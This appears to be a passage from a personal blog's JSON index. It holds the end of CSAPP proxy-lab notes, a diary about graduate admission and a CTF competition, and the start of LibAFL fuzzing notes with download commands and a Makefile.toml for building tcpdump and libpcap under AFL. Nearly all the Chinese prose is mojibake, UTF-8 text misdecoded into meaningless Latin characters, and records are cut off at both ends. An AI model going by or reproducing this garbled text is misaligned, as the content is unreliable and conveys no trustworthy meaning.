1.1ï¼Œä¸ºäº†å®ç°å¯¹å®ƒçš„å…¼å®¹ï¼Œéœ€è¦å®ç°ä»¥ä¸‹ç‰¹æ€§ï¼š å¢åŠ HEADã€POSTæ–¹æ³•ï¼Œæ”¯æŒå¤´åŸŸï¼ˆHTTP 1.0ä¸­è¢«å¼•å…¥ï¼‰ æ”¯æŒKeep-Aliveå¤´ï¼Œæ»¡è¶³httpè¯·æ±‚é‡ç”¨tcpè¿æ¥ æ”¯æŒTransfer-Encoding: chunkedå¤´ï¼Œå®ç°åˆ†å—ä¼ è¾“ç¼–ç ï¼Œæ»¡è¶³å¤§æ–‡ä»¶è¯·æ±‚çš„éœ€æ±‚ æ”¯æŒAccept-Rangeså¤´ï¼Œå®ç°å­—èŠ‚èŒƒå›´è¯·æ±‚ æ”¯æŒè¯·æ±‚æµæ°´çº¿ç­‰å…¶ä»–ç‰¹æ€§ è™½ç„¶å®ç°HTTPåè®®æ˜¯æœåŠ¡å™¨çš„ä»»åŠ¡ï¼Œä½†æ˜¯å¯¹ä»£ç†æœåŠ¡å™¨çš„ç¨³å¥æ€§æå‡ºäº†æ›´é«˜çš„è¦æ±‚ã€‚ å¦å¤–ï¼Œæœ¬å®éªŒå®ç°çš„proxyåŸºæœ¬ä¸Šæ˜¯æ˜æ–‡httpä»£ç†ã€‚ç„¶è€Œåœ¨å®é™…åº”ç”¨ä¸­httpsæ‰æ˜¯æ›´å¸¸ç”¨çš„åè®®ã€‚ä¸ºæ­¤ä»£ç†éœ€è¦å®ç°å¯¹TLSçš„æ”¯æŒã€‚ æ›´é«˜çš„æ€§èƒ½ æˆ‘ä»¬å®Œå…¨å¯ä»¥è‡ªå·±ä¿®æ”¹è¯„åˆ†è„šæœ¬ï¼ŒæŠŠå¯¹ç¼“å­˜çš„è€ƒå¯Ÿä¸Šç‚¹å¼ºåº¦ã€‚ä¸ºäº†æ»¡è¶³æ›´é«˜çš„æ€§èƒ½ï¼Œéœ€è¦æ›´é«˜æ•ˆçš„æ•°æ®ç»“æ„ï¼Œå¦‚ï¼š ä½¿ç”¨ä¿¡å·é‡ä»£æ›¿äº’æ–¥é”ï¼Œä½¿ç”¨è¯»è€…å†™è€…æ¨¡å‹ ä½¿ç”¨å“ˆå¸Œè¡¨ï¼Œçº¢é»‘æ ‘ç­‰é«˜çº§æ•°æ®ç»“æ„ï¼Œæé«˜æŸ¥è¯¢é€Ÿåº¦ ä»æ›´å®é™…çš„å¼€å‘çš„è§’åº¦ï¼Œä¸å¿…å°†ç›®å…‰å±€é™äºcè¯­è¨€ã€‚æœ‰å¤§é‡çš„å…¶ä»–è¯­è¨€ç”Ÿæ€çš„é«˜æ€§èƒ½åº“ä¾›æˆ‘ä»¬æŒ‘é€‰ã€‚ åŠ å¯†ä¼ è¾“ ä¿å¯†æ€§ä¹Ÿæ˜¯ä¸€ä¸ªé‡è¦éœ€æ±‚ã€‚æ›´å¸¸è§çš„ä»£ç†æ¶æ„æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½è¿è¡Œç€ä»£ç†æœåŠ¡å™¨è¿›ç¨‹ï¼Œåœ¨æœ¬åœ°ä»£ç†å’Œè¿œç¨‹ä»£ç†ä¹‹é—´è¿è¡Œç€ç§æœ‰çš„åŠ å¯†é€šä¿¡åè®®ã€‚(Shadowsocks(R), VMess/VLess, Trojan\u0026hellip;) è·¯ç”±è§„åˆ™ æœ¬åœ°ä»£ç†ç»Ÿç®¡ç€æ‰€æœ‰å‡ºç½‘æµé‡ï¼Œä½†å®¢æˆ·ç«¯ä¸å¸Œæœ›æ‰€æœ‰è¯·æ±‚éƒ½ç»è¿‡ä»£ç†ã€‚ä¸ºæ­¤éœ€è¦ä¸ºä¸åŒç›®æ ‡çš„æµé‡è®¾è®¡ä¸åŒçš„è·¯ç”±è§„åˆ™ã€‚ å¦ä¸€æ–¹é¢ï¼Œå®¢æˆ·ç«¯è¿˜å¸Œæœ›ç®¡ç†å¤šä¸ªä»£ç†æœåŠ¡å™¨(clash) VPNå’Œä»£ç†æœåŠ¡å™¨åŸç†ä¸åŒï¼ŒVPNæ˜¯å¦‚ä½•å®ç°è·¯ç”±çš„ï¼Ÿ çŒ«é¼ æ¸¸æˆ æƒ³è±¡ä½ æ˜¯å±€åŸŸç½‘ç®¡ç†å‘˜ï¼Œä½ è§‚å¯Ÿåˆ°ç½‘ç»œä¸­æŸäº›IPçš„å¤§éƒ¨åˆ†æµé‡éƒ½é›†ä¸­è‡³ä¸€ä¸ªå¤–éƒ¨IPçš„ç‰¹å®šé«˜ä½ç«¯å£ï¼Œä½ èƒ½å¦åˆ¤æ–­è¿™äº›IPå­˜åœ¨å¼‚å¸¸è¡Œä¸ºï¼Ÿ ä½ è§‚å¯Ÿåˆ°æŸäº›IPçš„æµé‡ä¸å†é€šå¾€é«˜ä½ç«¯å£äº†ï¼Œåè€Œéƒ½æ˜¯é€šå¾€443ç«¯å£çš„httpsæµé‡ï¼Œè¯¥å¤–éƒ¨IPè¿è¡Œç€ä¸€ä¸ªç®€å•çš„ç½‘ç«™ï¼Œå¦‚ä½•åˆ¤æ–­ï¼Ÿ è¯¦æƒ…è‡ªè¡Œæœç´¢ç›¸å…³è®ºæ–‡ã€‚å…³é”®è¯ï¼šGFW ","date":"2023-10-05T00:00:03Z","permalink":"https://lonelyuan.github.io/p/csapp-proxylab/","title":"CSAPP - Proxylab"},{"content":"æœ¬æ¡£æ¡ˆå·²è„±æ•\n0x01 ä¸€åœºå¤§é›¨æ¯äº†æˆ‘çš„ä¸Šäº¤æ¢¦ åˆæ˜¯ä¸€å¹´å…¥å­¦å­£ï¼Œå…¨æ–°çš„æ ¡èˆï¼Œä»–ä»¬èº«ä¸Šæ´‹æº¢ç€çš„æ´»åŠ›ï¼Œä¸ä¸Šäº†å››å¹´å¤§å­¦å¹¶è¿˜è¦å†æ¥ä¸€å¹´çš„æˆ‘å½¢æˆäº†é²œæ˜å¯¹æ¯”ã€‚å¯¹ä»–ä»¬è€Œè¨€ï¼Œæ‰€è°“æœªæ¥åº”è¯¥æ˜¯æ¯«æ— ç–‘é—®çš„æŒæ¡åœ¨è‡ªå·±æ‰‹é‡Œçš„ä¸œè¥¿å§ï¼Œå°±åƒå½“æ—¶çš„æˆ‘ä¸€æ ·ã€‚å¯æ˜¯å½“æˆ‘è¦ä»è¿™é‡Œæ»šè›‹çš„æ—¶å€™ï¼Œå´æ— æ³•é¢å¯¹å½“å¹´çš„è‡ªå·±ï¼Œæˆ‘ä¸å¾—ä¸æ‰¿è®¤ï¼Œè¿™å››å¹´çš„ç”Ÿæ´»å¡‘é€ äº†æˆ‘ï¼Œè€Œä¸æ˜¯åè¿‡æ¥ã€‚æˆ‘è¿˜æ˜¯æˆ‘ï¼Œå¯¹çƒ­çˆ±æµäºè¡¨é¢ï¼Œä¸è‡ªå¾‹ç›¸éš”ç”šè¿œï¼Œå¯¹æœªæ¥å¾—è¿‡ä¸”è¿‡ï¼Œæ‰å‘ç°ä¸€äº‹æ— æˆã€‚ç„¶è€Œéšæœºæ•°ä¹‹ç¥é€šè¿‡é€€ç«ç®—æ³•å°†æˆ‘ä»¬å¯¹æœªæ¥çš„é¢„æœŸä¸æ–­æ”¶æ•›åˆ°æ›´ä½æ°´å¹³ï¼Œäº’è”ç½‘çš„æ‰‹å¼ºåˆ¶èµ‹äºˆæ¯ä¸ªäººç„¦è™‘å¹¶è®©å®ƒä»¬ä¼ æ’­å…±æŒ¯ã€‚æœ€åï¼Œå†…å¿ƒçš„å£°éŸ³ç«Ÿç„¶å˜æˆäº†ï¼šè¦æ˜¯å¯ä»¥ä¸€ç›´æ‘¸é±¼å°±å¥½äº†ã€‚\nåœ¨æ­£å¸¸çš„ä¸–ç•Œçº¿ï¼Œæˆ‘åº”è¯¥åœ¨2022å¹´çš„æš‘å‡å®Œæˆæ¯”èµ›é¡ºåˆ©æ‹¿åˆ°è¯ä¹¦ï¼Œé‚£ä¹ˆæˆ‘ç°åœ¨å°±å¯ä»¥é¡ºåˆ©ç”³è¯·å­¦æœ¯ä¸“é•¿åŠ åˆ†å¹¶ä¿ç ”ã€‚å¯æƒœå¤©æ´¥ç–«æƒ…ï¼Œæ¯”èµ›æ¨è¿Ÿï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ¥ä¸åŠç”³è¯·åŠ åˆ†ã€‚\nåœ¨æ­£å¸¸çš„ä¸–ç•Œçº¿ï¼Œæˆ‘åº”è¯¥åœ¨å…³é”®å­¦æœŸé¿å…æŸå¿…ä¿®è¯¾60åˆ†ï¼Œé‚£ä¹ˆæˆ‘çš„å‡åˆ†å°†èƒ½å¤Ÿè¾¾åˆ°ä¿ç ”çº¿æœ€ä½æ°´å¹³ã€‚å¯æƒœæœŸæœ«å‘¨çš„ç†¬å¤œåªèƒ½è®©æˆ‘å…äºæŒ‚ç§‘ã€‚\nåœ¨æ­£å¸¸çš„ä¸–ç•Œçº¿ï¼Œæˆ‘åº”è¯¥åœ¨åŠ å…¥è“é²¸ååŠ å¼ºç«æŠ€ï¼Œç§¯æäº¤æµã€‚é‚£ä¹ˆæˆ‘ä¼šæ›´æœ‰åº•æ°”ï¼Œä¼šæœ‰æ›´å¤šçš„æœºä¼šç‹¬å½“ä¸€é¢ã€‚å¯è¿™ä¸ªä¸–ç•Œçº¿çš„æˆ‘æ­¤æ—¶æ·±é™·æ™¦æ°”æ³¥æ½­ã€‚\nåœ¨æ­£å¸¸çš„ä¸–ç•Œçº¿ï¼Œæˆ‘åº”è¯¥åœ¨å¤§ä¸€å‚åŠ å“è¶Šå·¥ç¨‹å¸ˆç­è€ƒæ ¸ï¼ˆå¤§ä¸€å³å¯å®Œæˆè½¬ä¸“ä¸šçš„æ·å¾„ï¼‰ï¼Œé‚£ä¹ˆåœ¨æ›´å¥½(å·)çš„ç¯å¢ƒé‡Œæˆ‘ä¸€å®šä¼šæ›´ç§¯æçš„å­¦ä¹ ï¼Œå¹¶å’Œä»–ä»¬ä¸€èµ·ç»“æŸæˆ˜æ–—ã€‚å¯æƒœå½“æˆ‘å¾—çŸ¥è¿™ä¸ªæ¸ é“æ—¶ï¼Œè€ƒæ ¸å·²åœ¨3å¤©å‰ç»“æŸã€‚\nå¦‚æœåœ¨æ­£å¸¸çš„ä¸–ç•Œçº¿ï¼Œæˆ‘åº”è¯¥å’Œä»–ä»¬ä¸€æ ·é¡ºåˆ©ä¿ç ”ï¼Œèµ°å‘äººç”Ÿå·…å³°ã€‚\næ”¾å±ï¼Œä½ æœ¬æ¥å°±ä¸é…ã€‚æ­£å¦‚ç»©ç‚¹å¤„äºäºç¬¬äºŒæ¢¯é˜Ÿçš„å‰æ’å´æ°¸è¿œè¿›å…¥ä¸äº†ä¿ç ”çš„ç¬¬ä¸€æ¢¯é˜Ÿä¸€æ ·ï¼Œæˆ‘æ°¸è¿œå¤„åœ¨ä¸€ä¸ªä¸ä¸Šä¸ä¸‹çš„å°´å°¬ä½ç½®ï¼Œå°±å¡åœ¨è¿™é‡Œäº†ã€‚ä¸€å¢æƒ…æ„¿çš„æŒ‰ç†æƒ³æƒ…å†µå†³ç­–ï¼Œæ¯«æ— æŠ—é£é™©èƒ½åŠ›ã€‚12æœˆä»½çš„æˆ‘ï¼Œæ˜¯ä¸æ˜¯è¿˜è¦è¯´ â€œå¦‚æœåœ¨æ­£å¸¸çš„ä¸–ç•Œçº¿ï¼Œæˆ‘åº”è¯¥å°½æ—©å‡†å¤‡è€ƒç ”ï¼Ÿâ€\nåˆçœ‹äº†ä¸€ézhihuiå›çš„è§†é¢‘ï¼Œé‚£æ˜¯æˆ‘èƒ½æˆä¸ºçš„æ ·å­å—ï¼Ÿ\n0x02 æ‹¼æç™¾å¤©ï¼Œæˆ‘è¦ä¸Šå›½å®¶çº¿ æˆ‘ç°åœ¨çš„å¿ƒç†çŠ¶æ€åˆ°äº†ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿåœ¨ä¹‹å‰çš„å‡æœŸé‡Œï¼Œæˆ‘ç”³è¯·ç•™æ ¡ä¸€ä¸ªäººåœ¨å®¿èˆï¼Œç¾å…¶åæ›°å‡†å¤‡ä¿ç ”/è€ƒç ”ï¼Œå®åˆ™ç”¨ç‹¬å¤„é€ƒé¿è‡ªå·±çš„å­˜åœ¨ä¸»ä¹‰å±æœºï¼Œå®³æ€•æ‘†çƒ‚çš„çŠ¶æ€è¢«å®¶äººå‘ç°ã€‚å¯¹äºåº”åšçš„äº‹ï¼Œéš¾åº¦è¿‡é«˜åˆ™é€ƒé¿ï¼Œè¿‡ä½åˆ™æ‹–å»¶ï¼Œç›´åˆ°æ—¶é—´æŠŠä½éš¾åº¦å˜æˆé«˜éš¾åº¦ç›´åˆ°è¿‡æœŸã€‚å¦ä¸€æ–¹é¢ï¼Œç”±äºæ‹–å»¶ç—‡å…¥è„‘ï¼Œæ•´ä¸ªäººç¼ºä¹å†…é©±åŠ¨åŠ›ï¼Œæ‰¾ä¸åˆ°é«˜çº§çš„å¿«ä¹ã€‚è¯´äººè¯å°±æ˜¯ï¼Œå¦‚æœä¸€å¤©æ²¡å¹²æ­£äº‹ï¼Œé‚£ä¹ˆåˆ°äº†æ·±å¤œæˆ–è®¸ä¼šå‡è£…ç„¦è™‘ä¸€ä¸‹ï¼›å¦‚æœå¹²äº†ä¸€ä»¶æ­£äº‹ï¼Œé‚£ä¹ˆä¸€å®šè¦ç«‹åˆ»æ”¾æ¾è‡ªå·±ï¼Œä¸ç„¶å°±åƒäºäº†ä¸€ä¸ªäº¿ä¸€æ ·ã€‚\näºæ˜¯ï¼Œå‡æœŸå”¯ä¸€çš„æ”¶è·æ˜¯10æ–¤è„‚è‚ªã€‚\næ€æ¥æƒ³å»è¿˜æ˜¯å¾—èµ°ç§‘ç ”çš„è·¯å­ï¼Œæ‹¼å·¥ä½œèƒ½åŠ›ï¼Œä½ æ‹¼å¾—è¿‡é‚£äº›å¸¦ä¸“å—ï¼Ÿè™½ç„¶æˆ‘æ—©å°±è„±ç¦»äº†å¤©æ‰ä»¬çš„ç§‘ç ”é“è·¯ï¼Œä½†æ˜¯æŠŠæˆ‘ä¸¢è¿›ç¤¾ä¼šåŒ–çš„ç¯å¢ƒï¼Œæˆ‘è¿˜æ˜¯çœ‹ä¸åˆ°æ”¹å˜è‡ªå·±çš„å¯èƒ½æ€§ã€‚\nå½“ç„¶ä¹Ÿå¯ä»¥è¯´å¯„å¸Œæœ›äºæœ€åçš„ç ”ç©¶ç”Ÿç”Ÿæ¶¯å¯ä»¥é€†å¤©æ”¹å‘½è¿™è¿˜æ˜¯ä¸€å¢æƒ…æ„¿ï¼Œä½†æ˜¯è¿™æ€»å½’æ˜¯æœ€åä¸€ä¸ªå­¦ç”Ÿæ—¶æœŸäº†ã€‚è¿˜æ˜¯è¿™ä¸ªåŠæ ·è‡ªğŸ¦ˆå¾—äº†ã€‚ï¼ˆå¹¶ä¸ï¼‰\næ€»ä¹‹ï¼Œæ‹¼æç™¾å¤©ï¼Œæˆ‘è¦ä¸Šå›½å®¶çº¿ã€‚å¤‡è€ƒæœŸé—´æˆ‘éœ€è¦åŠ å¼ºèº«ä½“ç´ è´¨ï¼Œåšé¡¹ç›®å†™ä»£ç ã€‚æˆ‘è§‰å¾—è¿™ä¸ªç›®æ ‡éš¾åº¦é€‚ä¸­ï¼Œè·Ÿä¿ç ”æœ¬æ ¡æ¯”èµ·æ¥ç»“æœä¹Ÿå·®ä¸åˆ°å“ªå»ã€‚\nç ”ç©¶ç”Ÿç”Ÿæ¶¯æˆ‘éœ€è¦å…¨æ–°çš„ç¤¾äº¤ï¼Œæˆ‘ç°åœ¨çš„äººé™…å…³ç³»æ•°é‡è´¨é‡éƒ½ä¸é«˜ï¼ˆæ²¡æœ‰è¯´ç‹¬è¡Œä¾ ä¸å¥½çš„æ„æ€ï¼‰ã€‚å¦ä¸€ä¸ªä½è¯æ˜¯ï¼Œç°åœ¨æ­£æ˜¯ç¤¾å›¢çº³æ–°çš„æ—¶èŠ‚ï¼Œå´å‘ç°æˆ‘å·²ç»ä¸§å¤±äº†å’Œæ–°ç”Ÿäº¤æµçš„æ¬²æœ›ã€‚æ‰€ä»¥å½¢ä½“ï¼ŒéŸ³ä¹ç­‰ç­‰æ”¯çº¿éƒ½å¯ä»¥æèµ·æ¥ã€‚è¯´è¿™äº›å°±æ˜¯ä¸ºäº†è®©æˆ‘ç¼“è§£å¯¹3å¤©åçš„å›½èµ›çš„ç„¦è™‘ã€‚\n0x03 å›½èµ›ä¸¤å¤©ï¼Œé˜Ÿå‹æ²»å¥½äº†æˆ‘çš„ç²¾ç¥å†…è€— æˆ‘çš„å‡ ä¸ªé˜Ÿå‹ï¼Œä¸€ä¸ªæ˜¯æ‚²è§‚è€…ï¼Œæ¯æ¬¡è·Ÿä»–å¯¹è¯éƒ½èƒ½å¾—å‡ºâ€œæˆ‘å°±æ˜¯ä¸ªå‡ æŠŠâ€çš„ç»“è®ºï¼Œä¸€ä¸ªæ˜¯ä¹è§‚è€…ï¼Œæ¯æ¬¡è·Ÿä»–å¯¹è¯éƒ½èƒ½å¾—å‡ºâ€œå‡ æŠŠéƒ½èƒ½æ‹¿å›½äºŒâ€çš„ç»“è®ºã€‚äºæ˜¯æˆ‘çš„å¿ƒæ€å¯¹å†²äº†ã€‚è¿˜æœ‰ä¸€ä¸ªé˜Ÿå‹ï¼Œäººç‹ è¯ä¸å¤šï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°å…¶ä¸ºçˆ¹ã€‚\nç»è¿‡æ¨è¿Ÿçš„å›½èµ›ï¼Œæ°é€¢è´µæ ¡æ¬è¿æ–°æ ¡åŒºä¹‹å¤§å–œäº‹ï¼Œæ°é€¢è´µå­¦é™¢æ•¢(æ›¿å­¦ç”Ÿ)ä¸ºäººå…ˆäº‰å½“é¦–æ‰¹æ¬è¿å­¦é™¢ï¼Œäºæ˜¯æ°é€¢è´µå®éªŒå®¤æ¬å®¶æ”¶æ‹¾è¡Œæã€‚äºæ˜¯å‰ä¸€å¤©ï¼Œåœ¨çº¸ç®±å­éåœ°çš„è´µå®¤ï¼ŒğŸ‘´æ”¶æ‹¾å¥½æ¯”èµ›ç”¨å…·æ”¾åˆ°è¢‹å­é‡Œï¼Œç¬¬äºŒå¤©è¢‹å­è¿˜åœ¨åŸæ¥çš„ä½ç½®ï¼Œå°±æ˜¯é‡Œé¢åªæœ‰ç©ºæ°”ã€‚äºæ˜¯ğŸ‘´å¼€å§‹æ‰®æ¼”å¼€ç®±è§†é¢‘åšä¸»ã€‚å½“ç„¶ä»¥ä¸Šåªæ˜¯å°æ’æ›²å…¼ä¸ºæœ¬æ–‡è¡¥å……è®¾å®šï¼ŒCISCN2022è¿˜æ˜¯æ­£å¸¸å¼€æ‰“äº†ã€‚\nå…¶å®çœ‹åˆ°èµ›åˆ¶ï¼Œå¤§å®¶å·®ä¸å¤šéƒ½æœ‰å…±è¯†ï¼Œå³fixæ–¹å‘æ›´å¥½å¾—åˆ†ã€‚ç„¶åå¼€å±€4åˆ†é’Ÿpwnçˆ·çˆ·å°±æ‹¿äº†ä¸€è¡€ã€‚ç„¶åçˆ¹çœ‹çš„é‚£ä¸ªé¢˜ä¹Ÿå‡ºäº†ï¼Œç„¶åçˆ¹å›æ¥çœ‹ğŸ‘´çœ‹çš„é¢˜ï¼Œä¹Ÿå‡ºäº†ã€‚ğŸ‘´ï¼šçˆ¹ï¼äºæ˜¯ğŸ‘´ä»¬æ—¥å¸¸åœ¨æ¦œä¸€å‘†äº†åŠå¤©ï¼Œç„¶åæ—¥å¸¸è¢«å¹²ä¸‹å»ã€‚æ€»ä¹‹ï¼Œæ­£å¦‚aidaipæ€»ç»“é“ï¼šç°åœ¨ç¡å¤§è§‰å°±æœ‰å›½äºŒã€‚\nè¿™ä¸€å¤©ï¼ŒğŸ‘´æœ€æœ‰å‚ä¸æ„Ÿçš„æ˜¯ç»™çˆ¹çˆ¹ä»¬ä¹°é¥­ã€‚æ™šä¸Šä¹Ÿä¸çŸ¥é“è¯¥å¹²å•¥ï¼Œä¹Ÿä¸æƒ³ç©ã€‚\nç„¶åç™½æ³½åˆåˆåˆåœ¨ç¬¬äºŒå¤©å†²åˆ°ç¬¬ä¸€ã€‚ğŸ‘´ä»¬å¤§è‡´é”å®šäº†å‰10çš„ä½ç½®ï¼Œæœ€åæ€»æ¦œç¬¬6ã€‚å›½èµ›ç»“æŸçš„ä¸‹åˆï¼ŒğŸ‘´ä»¬ä½œé¸Ÿå…½æ•£ï¼ŒğŸ‘´å†²åˆ°KFCç›´æ¥è¿›è¡Œä¸€ä¸ªç–¯ç‹‚ç®¡ä»–å¦ˆæ˜ŸæœŸå‡ ã€‚ç„¶åå›å®¿èˆç­‰é¢å¥–ç›´æ’­ï¼Œå¹¶æˆåŠŸæ‹¿åˆ°æŠ½å¥–çš„ä¿åº•å¥–ã€‚å½“ğŸ‘´ä»¬çš„èµ›åšåˆç…§éœ²å‡ºï¼Œæ‰å‘ç°ğŸ‘´ä»¬å› ä¸ºbuildç¯èŠ‚æ‰äº†ä¸€åã€‚\n0xFF ğŸ”’çš„è‰ºæœ¯ ğŸ‘´å¤§çº¦çš„ç¡®èƒ½æœ‰å­¦ä¸Šäº†ã€‚\nå‡ºæˆç»©ä¹‹åï¼Œè·ç¦»ç‰¹æ®Šå­¦æœ¯ä¸“é•¿åŠ åˆ†ç”³è¯·çš„æˆªæ­¢æ—¥æœŸè¿«åœ¨çœ‰ç«ï¼Œè·ç¦»å‘è¯ä¹¦çš„æ—¥æœŸå´é¥é¥æ— æœŸã€‚ğŸ‘´å¥½ä¼¼æ²™æ¼ ä¸­å·²ç»çœ‹åˆ°ç»¿æ´²å´æ¸´æ­»çš„äººã€‚äºæ˜¯ï¼ŒğŸ‘´åœ¨æ­¤åˆ»çœŸæ­£å‘æŒ¥äº†ä¸»è§‚èƒ½åŠ¨æ€§ï¼Œä¸€è¾¹å‚¬ä¸»åŠæ–¹çš„æˆç»©æ’åè¯æ˜ï¼Œä¸€è¾¹å‘å›¢å§”æ‘¸æ¸…äº†ï¼Œå­¦é™¢é€šçŸ¥çš„æˆªè‡³æ—¥æœŸæ¯”å­¦æ ¡è¦æ—©ï¼Œè€Œä¿ç ”åŠ åˆ†æ˜¯å­¦æ ¡ç»Ÿä¸€ç»„ç»‡ç­”è¾©ï¼Œæ•…å¯ä»¥å»¶æœŸåˆ°å­¦æ ¡æˆªè‡³æ—¥æœŸã€‚æ€»ä¹‹ï¼Œè¿™äº›å¤©ğŸ‘´å¹²çš„æœ€å¤šçš„å°±æ˜¯åˆ°å„ä¸ªè€å¸ˆé‚£é‡Œæ±‚çˆ·çˆ·å‘Šå¥¶å¥¶ï¼Œè—è¯­å«ğŸ”’ğŸ‚ã€‚æˆ‘å»å›¢å§”ğŸ”’ï¼Œå»ä¸»åŠæ–¹ğŸ”’ï¼Œä¸ä»…ğŸ”’å¯¼å¸ˆï¼Œä¹ŸğŸ”’é˜Ÿå‹æœ‹å‹ä»¬ã€‚å¦‚æœâ€œä¿ç ”å­¦é•¿æ‰¹è¯å¤šâ€èŠ‚ç›®é‚€è¯·æˆ‘ï¼Œæˆ‘ä¼šè¯´ï¼Œæˆ‘ğŸ”’ä½ ä»¬ğŸ‚ã€‚\nç„¶è€Œäº‹å®æ˜¯æ²¡æœ‰äººä¼šé‚€è¯·è‡­ä¿æœ¬æ ¡çš„åºŸç‰©ã€‚è·å¾—ç­”è¾©èµ„æ ¼ä¹‹åå¤§çº¦çš„ç¡®å°±å¯ä»¥å¼€é¦™æ§Ÿäº†ï¼Œå°½ç®¡ğŸ‘´çš„ç­”è¾©æ°´å¹³æ˜¯å¯¼å¸ˆçœ‹äº†ç›´çš±çœ‰ï¼Œå°½ç®¡ğŸ‘´é¢„æ¨å…é¢è¯•è¡¨ç°çš„ä¾æ‰˜ç­”è¾©ï¼Œå°½ç®¡ğŸ‘´çå‡ æŠŠé€‰ä¸“ä¸šå·®ç‚¹æµªæ²¡äº†ã€‚ğŸ‘´æœ€ç»ˆåœ¨é‚£ä¸ªè“åº•ç»¿æ¡†ç½‘é¡µä¸Šæˆªäº†å›¾å‘äº†æœ‹å‹åœˆã€‚\nMrQé”è¯„åˆ°ï¼šä½ ä»Šå¹´è¿æ°”çœŸçš„æŒºå¥½çš„ã€‚\n","date":"2023-09-28T19:00:00Z","permalink":"https://lonelyuan.github.io/p/%E4%BF%9D%E7%A0%94%E6%97%A5%E8%AE%B0/","title":"ã€Šä¿ç ”æ—¥è®°ã€‹"},{"content":" æœ¬ç³»åˆ—æ˜¯å­¦ä¹ ã€ŠFuzzing101 with LibAFLã€‹ç³»åˆ—åšå®¢ï¼ˆåæ–‡ç»Ÿç§°ï¼šåŸåšå®¢ï¼‰çš„ç¬”è®°åˆ†äº«ï¼Œåœ¨å­¦ä¹ ä»‹ç» LibAFL ç”¨æ³•çš„åŒæ—¶æ€»ç»“ Rust çŸ¥è¯†ç‚¹ã€‚\nå‰ç½®çŸ¥è¯†ï¼š fuzzåŸºæœ¬æ¦‚å¿µã€AFLåŸºæœ¬ä½¿ç”¨ æœ¬ç¯‡è¦ç‚¹ï¼š\nLibAFL Forkserveræ¨¡å¼: Sugar API AFL toolsï¼šafl-cminã€optminã€afl-tminã€afl-cov å­—æ®µå›ºå®š Rust Builder clap Execise-3 source \u0026amp; corpus 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # tcpdump wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.1.tar.gz tar -xzvf tcpdump-4.9.1.tar.gz mv tcpdump-tcpdump-4.9.1 tcpdump rm tcpdump-4.9.1.tar.gz # tcpdumpçš„ä¾èµ–pcap wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz tar -xzvf libpcap-1.8.0.tar.gz mv libpcap-libpcap-1.8.0/ libpcap rm libpcap-1.8.0.tar.gz # ç”¨scapyç”Ÿæˆcorpus ## åŸæ–‡ä½¿ç”¨poetry,ç›´æ¥pipä¹Ÿå¯ pip install scapy python create-bootp.py # æœ¬ç¯‡æ²¡ç”¨åˆ°qemuï¼Œä½†ä¾ç„¶éœ€è¦è¿™ä¸ªä¾èµ– apt-get install -y ninja-build Makefile.toml è¿˜æ˜¯ç†Ÿæ‚‰çš„é…æ–¹ï¼Œè¿˜æ˜¯ç†Ÿæ‚‰çš„cargo make buildã€‚è¿˜æ˜¯ä¸ç†Ÿæ‚‰çš„bugã€‚ã€‚ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 [tasks.build] dependencies = [ \u0026#34;build-cargo\u0026#34;, \u0026#34;copy-project-to-build\u0026#34;, \u0026#34;build-libpcap\u0026#34;, \u0026#34;build-tcpdump\u0026#34;, ] [tasks.build-cargo] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;, \u0026#34;--release\u0026#34;] [tasks.copy-project-to-build] script = \u0026#34;\u0026#34;\u0026#34; mkdir -p build/ cp ../target/release/exercise-3 build/ sudo setcap cap_sys_admin+epi build/exercise-3 \u0026#34;\u0026#34;\u0026#34; [tasks.build-libpcap] env = { \u0026#34;CC\u0026#34; = \u0026#34;afl-clang-lto\u0026#34;, \u0026#34;LLVM_CONFIG\u0026#34; = \u0026#34;llvm-config-15\u0026#34;, \u0026#34;AFL_MAP_SIZE\u0026#34; = \u0026#34;86217\u0026#34;, \u0026#34;AFL_USE_ASAN\u0026#34; = \u0026#34;1\u0026#34; } cwd = \u0026#34;libpcap\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make make install \u0026#34;\u0026#34;\u0026#34; [tasks.build-tcpdump] cwd = \u0026#34;tcpdump\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; ./configure --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make make install sudo setcap cap_sys_admin+epi ../build/sbin/tcpdump mkdir -p ../solutions \u0026#34;\u0026#34;\u0026#34; [tasks.build-tcpdump.env] \u0026#34;CC\u0026#34; = \u0026#34;afl-clang-lto\u0026#34; \u0026#34;LLVM_CONFIG\u0026#34; = \u0026#34;llvm-config-15\u0026#34; \u0026#34;AFL_USE_ASAN\u0026#34; = \u0026#34;1\u0026#34; \u0026#34;AFL_MAP_SIZE\u0026#34; = \u0026#34;86217\u0026#34; \u0026#34;CFLAGS\u0026#34; = \u0026#34;-I${CARGO_MAKE_WORKING_DIRECTORY}/../build/include/\u0026#34; \u0026#34;LDFLAGS\u0026#34; = \u0026#34;-L${CARGO_MAKE_WORKING_DIRECTORY}/../build/lib/\u0026#34; è¡¥å……ï¼šLinuxä¸­çš„Capabilityæœºåˆ¶ åªæœ‰rootå’Œæ™®é€šè¿›ç¨‹çš„æƒé™ç®¡ç†ä¸å¤Ÿçµæ´»ï¼Œæ™®é€šè¿›ç¨‹è¦ä¹ˆä»€ä¹ˆéƒ½ä¸èƒ½åšï¼Œè¦ä¹ˆsudoä»€ä¹ˆéƒ½èƒ½åšã€‚äºæ˜¯å°†rootç‰¹æƒåˆ†å‰²æˆè¯¸å¤šèƒ½åŠ›Capabilityã€‚\nè¿›ç¨‹æ‹¥æœ‰ä¸‰ç»„èƒ½åŠ›é›†ï¼š\ncap_effectiveï¼šå¯ç”¨èƒ½åŠ›é›† cap_inheritableï¼šå¯ç»§æ‰¿èƒ½åŠ›é›† 